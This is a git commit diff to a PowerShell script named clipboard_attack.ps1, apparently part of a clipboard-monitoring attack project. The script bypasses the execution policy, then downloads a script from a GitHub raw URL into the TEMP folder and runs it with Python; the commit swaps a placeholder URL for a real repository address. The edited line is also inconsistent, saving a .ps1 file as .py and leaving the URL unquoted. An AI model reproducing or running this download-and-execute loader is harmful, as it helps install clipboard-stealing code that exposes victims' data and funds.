eeb49c38393113a4f711673e711e2d651320179c
ethxiaoli <85943770+ethxiaoli@users.noreply.github.com>
2025-02-12 20:13:34 +0800

    clipboard_attack.ps1

--- clipboard_attack.ps1
+++ clipboard_attack.ps1
@@ -2,6 +2,6 @@
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 # 下载并执行剪贴板监控脚本
-$scriptUrl = "https://raw.githubusercontent.com/你的GitHub用户名/clipboard-setup/main/clipboard_attack.py"
+$scriptUrl = https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/refs/heads/main/clipboard_attack.ps1
 Invoke-WebRequest -Uri $scriptUrl -OutFile "$env:TEMP\clipboard_attack.py"
 python $env:TEMP\clipboard_attack.py
